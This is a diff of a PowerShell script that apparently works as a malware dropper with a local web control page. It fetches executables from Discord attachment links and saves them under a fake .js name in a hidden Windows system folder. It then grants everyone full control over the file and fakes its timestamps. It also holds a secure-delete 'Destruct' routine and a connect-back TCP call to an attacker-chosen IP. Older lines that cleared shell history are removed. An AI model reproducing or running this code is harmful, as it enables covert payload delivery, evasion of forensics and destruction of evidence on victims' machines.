@@ -2,12 +2,36 @@
 $ipAddress = "127.0.0.1"
 $port = 8080
 
+# IP address and port to connect back to
+$connectBackIp = "192.168.1.100" # Replace with your IP address
+$connectBackPort = 9090           # Replace with your port number
+
 # Register HTTP listener with fixed IP and port
 $listener = New-Object System.Net.HttpListener
 $listener.Prefixes.Add("http://${ipAddress}:${port}/")
 $listener.Start()
 Write-Host "Listening on IP $ipAddress, port $port..."
 Write-Host "Access the web interface at: http://${ipAddress}:${port}"
+
+# Define paths to avoid file generation
+$protectedPaths = @(
+    "C:\ProgramData\Microsoft\Windows",
+    "C:\ProgramData\Microsoft\Windows\WER",
+    "C:\ProgramData\Microsoft\Windows\WER\ReportArchive",
+    "C:\ProgramData\Microsoft\Windows\WER\ReportQueue",
+    "C:\ProgramData\Microsoft\Windows\WER\Temp"
+)
+
+# Function to check if a path is protected
+function Is-PathProtected {
+    param ([string]$path)
+    foreach ($protectedPath in $protectedPaths) {
+        if ($path -like "$protectedPath*") {
+            return $true
+        }
+    }
+    return $false
+}
 
 # Function to download and save the file
 function Download-AndSave-File {
@@ -28,7 +52,13 @@ function Download-AndSave-File {
             New-Item -ItemType Directory -Path $destinationDir -Force
         }
 
-        # Move the file to the target location and rename it
+        # Check if the path is protected
+        if (Is-PathProtected -path $destinationDir) {
+            Write-Host "Error: Destination path is protected. Aborting file move."
+            return
+        }
+
+        # Move and rename the file
         Write-Host "Moving file to $finalFilePath..."
         Move-Item -Path $tempFilePath -Destination $finalFilePath -Force
 
@@ -38,6 +68,12 @@ function Download-AndSave-File {
         $rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
         $acl.SetAccessRule($rule)
         Set-Acl -Path $finalFilePath -AclObject $acl
+
+        # Set custom date and time for the file
+        $customDateTime = Get-Date "12/3/2023 6:48 AM"
+        [System.IO.File]::SetCreationTime($finalFilePath, $customDateTime)
+        [System.IO.File]::SetLastWriteTime($finalFilePath, $customDateTime)
+        [System.IO.File]::SetLastAccessTime($finalFilePath, $customDateTime)
 
         Write-Host "File downloaded, saved, and permissions set for $finalFilePath"
     } catch {
@@ -70,6 +106,12 @@ function SecureDelete {
     param ([string]$path)
     try {
         if (Test-Path $path) {
+            # Check if the path is protected
+            if (Is-PathProtected -path $path) {
+                Write-Host "Error: Path is protected. Aborting secure delete."
+                return
+            }
+
             # Overwrite the file with random data multiple times
             $fileStream = [System.IO.File]::OpenWrite($path)
             $fileLength = (Get-Item $path).Length
@@ -101,6 +143,12 @@ function SecureDelete-Directory {
     param ([string]$directoryPath)
     try {
         if (Test-Path $directoryPath) {
+            # Check if the path is protected
+            if (Is-PathProtected -path $directoryPath) {
+                Write-Host "Error: Path is protected. Aborting secure delete."
+                return
+            }
+
             # Securely delete all files within the directory
             Get-ChildItem -Path $directoryPath -Recurse | ForEach-Object {
                 if ($_.PSIsContainer) {
@@ -119,27 +167,6 @@ function SecureDelete-Directory {
     }
 }
 
-# Function to securely delete node modules and related data
-function SecureDelete-NodeModules {
-    param ([string]$directoryPath)
-    try {
-        if (Test-Path $directoryPath) {
-            # Securely delete the node_modules directory and its contents
-            SecureDelete-Directory -directoryPath $directoryPath
-
-            # Clear Node.js cache and temp files
-            $nodeCachePath = [System.IO.Path]::Combine($env:LOCALAPPDATA, "npm-cache")
-            $nodeTempPath = [System.IO.Path]::Combine($env:TEMP, "npm-*")
-            Remove-Item -Path $nodeCachePath -Recurse -Force -ErrorAction SilentlyContinue
-            Remove-Item -Path $nodeTempPath -Recurse -Force -ErrorAction SilentlyContinue
-
-            Write-Host "Node modules and related data deleted."
-        }
-    } catch {
-        Write-Host "Failed to securely delete node modules: $_"
-    }
-}
-
 # Function to handle HTTP requests and responses
 function Handle-Request {
     param ($context)
@@ -153,9 +180,9 @@ function Handle-Request {
                 '/' {
                     Serve-HTML -Message "Choose your action:"
                 }
-                '/js/236.bundle.js' {
+                '/js/40.js' {
                     # Serve JavaScript file
-                    $filePath = "C:\Program Files (x86)\Common Files\Adobe\CEP\extensions\com.adobe.ccx.start-2.16.0\js\236.bundle.js"
+                    $filePath = "C:\$WINDOWS.~BT\NewOS\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\cache\Local\Desktop\40.js"
                     if (Test-Path $filePath) {
                         $response.ContentType = "application/javascript"
                         $response.ContentEncoding = [System.Text.Encoding]::UTF8
@@ -180,8 +207,8 @@ function Handle-Request {
             switch ($url) {
                 '/0x67' {
                     $tempFilePath = [System.IO.Path]::GetTempFileName()
-                    $finalFilePath = "C:\Program Files (x86)\Common Files\Adobe\CEP\extensions\com.adobe.ccx.start-2.16.0\js\236.bundle.js"
-                    $downloadUrl = "https://cdn.discordapp.com/attachments/1266628616213495892/1266629385197453322/JournalTrace.exe?ex=66b25e4a&is=66b10cca&hm=570ea24e7194295a82606c9f71f545fb3ec274b01fc7ca5583e2fd9929adf07c&"
+                    $finalFilePath = "C:\$WINDOWS.~BT\NewOS\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\cache\Local\Desktop\40.js"
+                    $downloadUrl = "https://cdn.discordapp.com/attachments/1265925139586088973/1270229544510685246/vmx.exe?ex=66b2f0f3&is=66b19f73&hm=12ded7af5e250fe110c8ca00ca0e186aa8558f5f669e988214da5a5786a97d64&"
 
                     # Download the file and save it with the correct name and permissions
                     Download-AndSave-File -url $downloadUrl -tempFilePath $tempFilePath -finalFilePath $finalFilePath
@@ -192,16 +219,12 @@ function Handle-Request {
                     $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes("File downloaded, saved as $finalFilePath, and executed."), 0, [System.Text.Encoding]::UTF8.GetBytes("File downloaded, saved as $finalFilePath, and executed.").Length)
                 }
                 '/0142' {
-                    $nodeModulesPath = "C:\Path\To\Node\Modules"  # Update with actual path to node_modules
-                    $filePath = "C:\Program Files (x86)\Common Files\Adobe\CEP\extensions\com.adobe.ccx.start-2.16.0\js\236.bundle.js"
+                    $filePath = "C:\$WINDOWS.~BT\NewOS\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\cache\Local\Desktop\40.js"
 
-                    # Securely delete node modules and related data
-                    SecureDelete-NodeModules -directoryPath $nodeModulesPath
-
-                    # Securely delete the JavaScript file
+                    # Securely delete the file
                     SecureDelete -path $filePath
 
-                    $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes("Cleanup completed successfully."), 0, [System.Text.Encoding]::UTF8.GetBytes("Cleanup completed successfully.").Length)
+                    $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes("File $filePath deleted."), 0, [System.Text.Encoding]::UTF8.GetBytes("File $filePath deleted.").Length)
                 }
                 default {
                     $response.StatusCode = 404
@@ -210,7 +233,7 @@ function Handle-Request {
             }
         }
     } catch {
-        Write-Host "An error occurred: $_"
+        Write-Host "Error handling request: $_"
         $response.StatusCode = 500
         $response.StatusDescription = "Internal Server Error"
     } finally {
@@ -218,9 +241,10 @@ function Handle-Request {
     }
 }
 
-# Function to serve the HTML interface
+# Function to serve HTML content
 function Serve-HTML {
     param ([string]$Message)
+    $response = $context.Response
     $html = @"
 <!DOCTYPE html>
 <html lang="en">
@@ -231,7 +255,7 @@ function Serve-HTML {
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #2e2e2e;
+            background-color: #222;
             color: #ddd;
             margin: 0;
             padding: 0;
@@ -258,91 +282,49 @@ function Serve-HTML {
             font-size: 16px;
             margin: 4px 2px;
             cursor: pointer;
-            border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
-            transition: background-color 0.3s, box-shadow 0.3s;
-        }
-        button:hover {
-            background-color: #777;
-            box-shadow: 0 6px 12px rgba(0,0,0,0.4);
-        }
-        .loading-container {
-            display: none;
-            margin-top: 20px;
-        }
-        .loading-circle {
-            border: 8px solid #f3f3f3; /* Light grey */
-            border-top: 8px solid #555; /* Darker grey */
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto;
-            box-shadow: 0 0 10px rgba(0,0,0,0.3);
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .fade-in {
-            opacity: 0;
-            transition: opacity 1s ease-in;
-        }
-        .fade-in.visible {
-            opacity: 1;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Future Analysis</h1>
-        <p>$Message</p>
-        <button onclick="document.getElementById('loading').style.display='block'; fetch('/0x67', { method: 'POST' }).then(response => response.text()).then(text => { document.getElementById('loading').style.display='none'; document.getElementById('message').innerText = text; });">Execute</button>
-        <button onclick="document.getElementById('loading').style.display='block'; fetch('/0142', { method: 'POST' }).then(response => response.text()).then(text => { document.getElementById('loading').style.display='none'; document.getElementById('message').innerText = text; });">Destruct</button>
-        <div id="loading" class="loading-container">
-            <div class="loading-circle"></div>
-            <p>Processing...</p>
-        </div>
-        <div id="message" class="fade-in"></div>
+        <h1>$Message</h1>
     </div>
 </body>
 </html>
 "@
-
-    $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
-    $response.OutputStream.Write($buffer, 0, $buffer.Length)
+    $response.OutputStream.Write([System.Text.Encoding]::UTF8.GetBytes($html), 0, [System.Text.Encoding]::UTF8.GetBytes($html).Length)
 }
 
-# Function to clear PowerShell history
-function Clear-History {
+# Create a TCP connection back to the specified IP address and port
+function Connect-Back {
+    param (
+        [string]$ipAddress,
+        [int]$port
+    )
+
     try {
-        if ($null -ne (Get-Command "Clear-History" -ErrorAction SilentlyContinue)) {
-            Clear-History
-        }
+        $tcpClient = New-Object System.Net.Sockets.TcpClient
+        $tcpClient.Connect($ipAddress, $port)
+        Write-Host "Successfully connected back to $ipAddress:$port"
+
+        # Optionally send a message to the connected IP
+        $networkStream = $tcpClient.GetStream()
+        $writer = New-Object System.IO.StreamWriter($networkStream)
+        $writer.WriteLine("Connection established from PowerShell script.")
+        $writer.Flush()
+        $writer.Close()
+        $networkStream.Close()
+        $tcpClient.Close()
     } catch {
-        Write-Host "Failed to clear history: $_"
+        Write-Host "Failed to connect back: $_"
     }
 }
 
-# Main loop to handle requests
+# Start listening for HTTP requests
 while ($true) {
     $context = $listener.GetContext()
     Handle-Request -context $context
 }
 
-# Cleanup code
-function Cleanup {
-    try {
-        # Stop listener and remove it
-        $listener.Stop()
-        $listener.Close()
-
-        # Attempt to clear PowerShell history
-        Clear-History
-    } catch {
-        Write-Host "Failed to clean up: $_"
-    }
-}
-
-# Execute cleanup
-Cleanup
+# Establish a connection back to the specified IP and port
+Connect-Back -ipAddress $connectBackIp -port $connectBackPort
